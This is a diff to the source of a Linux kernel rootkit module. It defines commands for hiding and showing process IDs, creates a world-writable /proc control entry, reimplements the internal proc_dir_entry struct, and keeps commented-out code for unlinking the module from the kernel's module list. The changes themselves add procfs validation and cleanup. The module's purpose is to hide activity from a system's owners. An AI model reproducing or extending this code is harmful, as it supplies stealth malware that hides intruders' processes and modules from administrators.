@@ -23,6 +23,7 @@ MODULE_LICENSE("GPL");
 #define HIDE_PID_CMD "hpid"
 #define SHOW_PID_CMD "spid"
 
+/* Re-writing proc_dir_entry, removed from Linux kernel since 3.10 */
 struct proc_dir_entry {
 		unsigned int low_ino;
 		umode_t mode;
@@ -73,7 +74,7 @@ void module_show(void) {
 }
 
 static ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *ppos) {
-		return 0;
+		return count;
 }
 
 static ssize_t rtkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos) {
@@ -91,25 +92,39 @@ static const struct file_operations rootkit_fops = {
 		.write = rtkit_write,
 };
 
+/* Initialize proc file system */
 static int procfs_init(void) {
 		proc_rtkit = proc_create(MODULE_NAME, 0666, NULL, &rootkit_fops);
-		if(proc_rtkit == NULL) return 0;
+		if(proc_rtkit == NULL)
+				return 0;
 		proc_root = proc_rtkit->parent;
-		if(proc_root == NULL) return 0;
+		if(proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
+				return 0;
+
 		return 1;
+}
+
+static void procfs_clean(void) {
+		if(proc_rtkit != NULL) {
+				remove_proc_entry(MODULE_NAME, NULL);
+				proc_rtkit = NULL;
+		}
 }
 
 static int __init rootkit_init(void) {
 		/* Hiding module. Commented because I can't stop it with rmmod */
 	//	list_del_init(&__this_module.list);
 	//	kobject_del(&THIS_MODULE->mkobj.kobj);
-		if(!procfs_init())
+		if(!procfs_init()) {
+				procfs_clean();
 				return 1;
+		}
 		printk(KERN_INFO "Loading rootkit\n");
 		return 0;
 }
 
 static void __exit rootkit_exit(void) {
+		procfs_clean();
 		printk(KERN_INFO "Closing rootkit\n");
 }
 
